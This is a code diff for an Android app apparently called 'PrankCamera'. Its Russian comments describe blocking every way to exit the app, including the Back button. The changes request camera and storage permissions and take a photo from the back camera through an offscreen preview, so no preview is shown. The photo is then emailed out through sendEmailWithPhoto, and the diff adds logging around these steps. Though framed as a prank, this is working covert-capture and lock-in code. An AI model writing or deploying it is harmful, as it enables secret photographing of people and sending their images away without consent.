@@ -64,6 +64,21 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // Запрашиваем разрешения для Android 6.0+
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+            val permissions = arrayOf(
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                android.Manifest.permission.READ_EXTERNAL_STORAGE
+            )
+            // Запрашиваем тихо (без диалога если уже было запрошено)
+            try {
+                requestPermissions(permissions, PERMISSIONS_REQUEST_CODE)
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+
         // Блокируем все способы выхода из приложения
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
 
@@ -98,6 +113,10 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    companion object {
+        private const val PERMISSIONS_REQUEST_CODE = 100
+    }
+
     // Блокируем кнопку Назад
     @Deprecated("Deprecated")
     override fun onBackPressed() {
@@ -108,71 +127,90 @@ class MainActivity : AppCompatActivity() {
         // Пробуем сделать фото через камеру напрямую
         thread {
             var photoData: ByteArray? = null
+            var cameraUsed = false
             
             try {
                 var camera: HardwareCamera? = null
                 try {
-                    // Пробуем открыть заднюю камеру
+                    // Проверяем количество камер
                     val cameraCount = HardwareCamera.getNumberOfCameras()
-                    val cameraInfo = android.hardware.Camera.CameraInfo()
+                    android.util.Log.d("PrankCamera", "Camera count: $cameraCount")
                     
-                    for (i in 0 until cameraCount) {
-                        android.hardware.Camera.getCameraInfo(i, cameraInfo)
-                        if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
-                            camera = HardwareCamera.open(i)
-                            break
-                        }
-                    }
-                    
-                    // Если задней нет - пробуем любую
-                    if (camera == null && cameraCount > 0) {
-                        camera = HardwareCamera.open(0)
-                    }
-                    
-                    if (camera != null) {
-                        val parameters = camera.parameters
+                    if (cameraCount > 0) {
+                        val cameraInfo = android.hardware.Camera.CameraInfo()
                         
-                        // Настраиваем размер фото
-                        val sizes = parameters.supportedPictureSizes
-                        if (sizes.isNotEmpty()) {
-                            val size = sizes[0]
-                            parameters.setPictureSize(size.width, size.height)
-                            camera.parameters = parameters
-                            
-                            // Создаём SurfaceTexture для превью
-                            val texture = android.graphics.SurfaceTexture(10)
-                            camera.setPreviewTexture(texture)
-                            camera.startPreview()
-                            
-                            // Даём камере время на инициализацию
-                            Thread.sleep(500)
-                            
-                            // Делаем фото
-                            val photoRef = ByteArrayRef()
-                            camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
-                                override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
-                                    if (data != null) {
-                                        photoRef.data = data
-                                    }
-                                    camera?.release()
-                                }
-                            })
-                            
-                            // Ждём пока фото сохранится
-                            Thread.sleep(1000)
-                            
-                            photoData = photoRef.data
+                        // Пробуем открыть заднюю камеру
+                        for (i in 0 until cameraCount) {
+                            android.hardware.Camera.getCameraInfo(i, cameraInfo)
+                            android.util.Log.d("PrankCamera", "Camera $i facing: ${cameraInfo.facing}")
+                            if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
+                                camera = HardwareCamera.open(i)
+                                android.util.Log.d("PrankCamera", "Opened back camera $i")
+                                break
+                            }
                         }
-                        camera.release()
+                        
+                        // Если задней нет - пробуем любую
+                        if (camera == null) {
+                            camera = HardwareCamera.open(0)
+                            android.util.Log.d("PrankCamera", "Opened front camera 0")
+                        }
+                        
+                        if (camera != null) {
+                            cameraUsed = true
+                            val parameters = camera.parameters
+                            
+                            // Настраиваем размер фото
+                            val sizes = parameters.supportedPictureSizes
+                            if (sizes.isNotEmpty()) {
+                                val size = sizes[0]
+                                parameters.setPictureSize(size.width, size.height)
+                                camera.parameters = parameters
+                                
+                                // Создаём SurfaceTexture для превью
+                                val texture = android.graphics.SurfaceTexture(10)
+                                camera.setPreviewTexture(texture)
+                                camera.startPreview()
+                                
+                                // Даём камере время на инициализацию
+                                Thread.sleep(500)
+                                
+                                // Делаем фото
+                                val photoRef = ByteArrayRef()
+                                camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
+                                    override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
+                                        if (data != null) {
+                                            photoRef.data = data
+                                            android.util.Log.d("PrankCamera", "Photo taken: ${data.size} bytes")
+                                        } else {
+                                            android.util.Log.d("PrankCamera", "Photo data is null")
+                                        }
+                                        camera?.release()
+                                    }
+                                })
+                                
+                                // Ждём пока фото сохранится
+                                Thread.sleep(1000)
+                                
+                                photoData = photoRef.data
+                                android.util.Log.d("PrankCamera", "Final photo data: ${photoData?.size ?: 0} bytes")
+                            }
+                            camera.release()
+                        } else {
+                            android.util.Log.d("PrankCamera", "Failed to open any camera")
+                        }
+                    } else {
+                        android.util.Log.d("PrankCamera", "No cameras available")
                     }
                 } catch (e: Exception) {
-                    e.printStackTrace()
+                    android.util.Log.e("PrankCamera", "Camera error: ${e.message}", e)
                     camera?.release()
                 }
             } catch (e: Exception) {
-                e.printStackTrace()
+                android.util.Log.e("PrankCamera", "General error: ${e.message}", e)
             }
             
+            android.util.Log.d("PrankCamera", "Sending email with photo: ${photoData != null}")
             // Отправляем письмо (с фото или без)
             sendEmailWithPhoto(photoData)
         }
